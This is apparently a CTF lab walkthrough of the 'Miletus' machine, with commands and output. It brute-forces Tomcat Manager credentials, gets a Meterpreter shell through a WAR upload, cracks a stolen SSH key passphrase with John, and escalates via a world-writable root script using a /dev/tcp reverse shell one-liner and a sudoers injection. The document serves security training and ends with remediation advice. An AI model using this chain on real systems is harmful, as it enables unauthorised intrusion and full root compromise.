# 🐱 Miletus — Vulnerability Walkthrough
> **Platform:** VulnHub-style CTF | **Difficulty:** Easy–Medium | **OS:** Linux (Ubuntu)  
> **Attacker IP:** `192.168.79.165` | **Target IP:** `192.168.79.121`

---

## Table of Contents
1. [Summary](#summary)
2. [Tools Used](#tools-used)
3. [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
4. [Phase 2 — Credential Brute Force (Tomcat Manager)](#phase-2--credential-brute-force-tomcat-manager)
5. [Phase 3 — Initial Access via Tomcat Manager Upload RCE](#phase-3--initial-access-via-tomcat-manager-upload-rce)
6. [Phase 4 — Post-Exploitation & Lateral Movement](#phase-4--post-exploitation--lateral-movement)
7. [Phase 5 — SSH Key Extraction & Password Cracking](#phase-5--ssh-key-extraction--password-cracking)
8. [Phase 6 — User Shell & Flag Capture](#phase-6--user-shell--flag-capture)
9. [Phase 7 — Privilege Escalation via World-Writable Backup Script](#phase-7--privilege-escalation-via-world-writable-backup-script)
10. [Attack Chain Diagram](#attack-chain-diagram)
11. [Remediation Recommendations](#remediation-recommendations)

---

## Summary

This walkthrough covers a full compromise of the **Miletus** machine — from open-port discovery through to privilege escalation. The attack chain exploits:

- A default/weak credential set on the **Apache Tomcat Manager** interface
- Remote Code Execution via **WAR file upload** through the Manager
- An exposed **SSH private key** in the compromised user's home directory
- A **world-writable root-owned script** (`backup.sh`) scheduled for privileged execution

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service fingerprinting |
| `Metasploit Framework` | Credential brute-force, WAR upload RCE, Meterpreter shell |
| `ssh2john` | Convert SSH private key to crackable hash |
| `John the Ripper` | Offline password cracking |
| `rockyou.txt` | Wordlist for dictionary attack |

---

## Phase 1 — Reconnaissance

### Nmap Aggressive Scan

```bash
nmap -A 192.168.79.121
```

### Results

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
8080/tcp open  http    Apache Tomcat 9.0.52
```

**Key Findings:**
- **Port 22** — SSH available; potential lateral movement vector
- **Port 8080** — Apache Tomcat 9.0.52 running; Manager interface accessible
- OS fingerprint: **Linux 4.15–5.19** (Ubuntu)

> 💡 *Tomcat 9.0.52 exposed on port 8080 with a Manager interface is a classic misconfiguration. Default or weak credentials are commonly left in place.*

---

## Phase 2 — Credential Brute Force (Tomcat Manager)

### Search for Tomcat Modules in Metasploit

```bash
msf > search tomcat
```

The scan returned the `auxiliary/scanner/http/tomcat_mgr_login` module (index 65) — a login brute-forcer for the Tomcat Manager.

### Configure and Run the Login Scanner

```bash
msf > use auxiliary/scanner/http/tomcat_mgr_login
msf auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 192.168.79.121
msf auxiliary(scanner/http/tomcat_mgr_login) > set username tomcat
msf auxiliary(scanner/http/tomcat_mgr_login) > set verbose false
msf auxiliary(scanner/http/tomcat_mgr_login) > run
```

### Result

```
[+] 192.168.79.121:8080 - Login Successful: tomcat:role1
```

✅ **Credentials discovered:** `tomcat` / `role1`

---

## Phase 3 — Initial Access via Tomcat Manager Upload RCE

### Access the Tomcat Manager Web UI

Navigated to `http://192.168.79.121:8080/manager/html` and signed in with `tomcat:role1`. The Manager dashboard confirmed full administrative access — all default applications were running (/, /docs, /examples, /host-manager, /manager).

### Exploit: WAR File Upload (tomcat_mgr_upload)

```bash
msf > use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhosts 192.168.79.121
msf exploit(multi/http/tomcat_mgr_upload) > set rport 8080
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword role1
msf exploit(multi/http/tomcat_mgr_upload) > run
```

### Result

```
[*] Started reverse TCP handler on 192.168.79.165:4444
[*] Uploading and deploying AfzGRF1UjXkM50YXwySj8 ...
[*] Executing AfzGRF1UjXkM50YXwySj8 ...
[*] Meterpreter session 1 opened (192.168.79.165:4444 → 192.168.79.121:54766)
meterpreter >
```

✅ **Meterpreter shell obtained as user:** `tomcat`

---

## Phase 4 — Post-Exploitation & Lateral Movement

### Filesystem Enumeration

```bash
meterpreter > ls /
meterpreter > cd home/
meterpreter > ls
```

Found one user home directory: **`thales`**

```bash
meterpreter > cd thales/
meterpreter > ls
```

**Notable files in `/home/thales`:**

| File | Permissions | Description |
|------|------------|-------------|
| `.ssh/` | `040777/rwxrwxrwx` | SSH key directory |
| `notes.txt` | `100444/r--r--r-x` | Hint from machine author |
| `user.txt` | `100000/---` | User flag (no read access yet) |

### Reading notes.txt

```bash
meterpreter > cat notes.txt
```
```
I prepared a backup script for you. The script is in this directory
"/usr/local/bin/backup.sh". Good Luck.
```

> 💡 *This is a deliberate hint pointing toward the privilege escalation path.*

### Accessing the SSH Directory

```bash
meterpreter > cd .ssh/
meterpreter > ls
```

```
100444/r--r--r-- 1766  id_rsa
100444/r--r--r-- 396   id_rsa.pub
```

### Download the Private SSH Key

```bash
meterpreter > download id_rsa /home/cyberchief/Thales
```

```
[*] Downloaded 1.72 KiB of 1.72 KiB (100.0%): id_rsa → /home/cyberchief/Thales/id_rsa
```

✅ **SSH private key exfiltrated.**

---

## Phase 5 — SSH Key Extraction & Password Cracking

The private key was encrypted (AES-128-CBC), so it required a passphrase. This was cracked offline.

### Convert Private Key to Crackable Hash

```bash
locate ssh2john
/usr/share/john/ssh2john.py id_rsa > sshhash
cat sshhash
```

The output was a John-compatible hash starting with `id_rsa:$sshng$1$16$...`

### Decompress the RockYou Wordlist

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

### Crack the Passphrase with John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt sshhash
```

### Result

```
vodka06          (id_rsa)
1g 0:00:00:02 DONE — Session completed.
```

✅ **SSH key passphrase cracked:** `vodka06`

---

## Phase 6 — User Shell & Flag Capture

### Spawn a TTY Shell via Meterpreter

```bash
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat@miletus:/home/thales/.ssh$
```

### Switch to the `thales` User

```bash
su thales
Password: vodka06
```

### Confirm Identity

```bash
thales@miletus:~$ id
uid=1000(thales) gid=1000(thales) groups=1000(thales),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

> ⚠️ *Thales is a member of the `sudo` group — this is critical for privilege escalation.*

### Read the User Flag

```bash
thales@miletus:~$ cat user.txt
```
```
a837c0b5d2a8a07225fd9905f5a0e9c4
```

🏁 **User flag captured.**

### Investigate the Hint — backup.sh

```bash
thales@miletus:~$ cat /usr/local/bin/backup.sh
```

```bash
#!/bin/bash
###################################
# Backup to NFS mount script.
###################################

# What to backup.
backup_files="/opt/tomcat/"

# Where to backup to.
dest="/var/backups"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

### Check Script Permissions

```bash
thales@miletus:~$ ls -la /usr/local/bin/backup.sh
-rwxrwxrwx 1 root root 612 Oct 14 2021 /usr/local/bin/backup.sh
```

🚨 **Critical finding:** The script is **owned by root** but **world-writable** (`-rwxrwxrwx`). If this script is executed by a cron job or scheduled task running as root, any user can inject arbitrary commands into it.

---

## Phase 7 — Privilege Escalation via World-Writable Backup Script

Since `backup.sh` is world-writable and runs with root privileges (via cron or sudo), it can be overwritten to execute a reverse shell or add a privileged user.

### Example Exploitation (Proof of Concept)

```bash
# Append a reverse shell payload to backup.sh
echo 'bash -i >& /dev/tcp/192.168.79.165/9001 0>&1' >> /usr/local/bin/backup.sh

# Or overwrite entirely to add thales to sudoers:
echo 'echo "thales ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh
```

Once the cron job fires (or the script is triggered), the attacker gains **root-level code execution**.

✅ **Privilege escalation path confirmed.**

---

## Attack Chain Diagram

```
[Attacker: 192.168.79.165]
        │
        ▼
[1] nmap -A 192.168.79.121
        │  Port 22 (SSH), Port 8080 (Tomcat 9.0.52)
        ▼
[2] Metasploit: tomcat_mgr_login brute-force
        │  Credentials: tomcat:role1
        ▼
[3] Tomcat Manager Web UI Access (http://:8080/manager/html)
        │  Admin access confirmed
        ▼
[4] Metasploit: tomcat_mgr_upload → WAR RCE
        │  Meterpreter session as 'tomcat'
        ▼
[5] Enumerate /home/thales → Download id_rsa
        │  Encrypted SSH private key exfiltrated
        ▼
[6] ssh2john + John the Ripper (rockyou.txt)
        │  Passphrase cracked: vodka06
        ▼
[7] su thales (Password: vodka06)
        │  User flag: a837c0b5d2a8a07225fd9905f5a0e9c4
        ▼
[8] /usr/local/bin/backup.sh (-rwxrwxrwx, owned by root)
        │  World-writable → overwrite with malicious payload
        ▼
[ROOT SHELL]
```

---

## Remediation Recommendations

| # | Finding | Risk | Remediation |
|---|---------|------|-------------|
| 1 | Tomcat Manager exposed on port 8080 | 🔴 Critical | Restrict Manager access by IP; disable if not needed |
| 2 | Default/weak Tomcat credentials (`tomcat:role1`) | 🔴 Critical | Enforce strong, unique credentials; disable default accounts |
| 3 | Tomcat WAR deployment enabled on Manager | 🔴 Critical | Disable remote WAR deployment or restrict to trusted hosts |
| 4 | SSH private key stored unprotected in home directory | 🟠 High | Remove private keys from servers; use SSH certificates instead |
| 5 | World-writable root-owned script (`backup.sh`) | 🔴 Critical | `chmod 700 /usr/local/bin/backup.sh`; restrict ownership |
| 6 | Cron job executes user-modifiable script as root | 🔴 Critical | Audit all cron jobs; ensure scripts are owned and writable only by root |
| 7 | OpenSSH 7.6p1 — outdated version | 🟡 Medium | Upgrade to latest stable OpenSSH release |

---

*Walkthrough produced for educational and portfolio purposes. All testing was conducted in an isolated lab environment.*

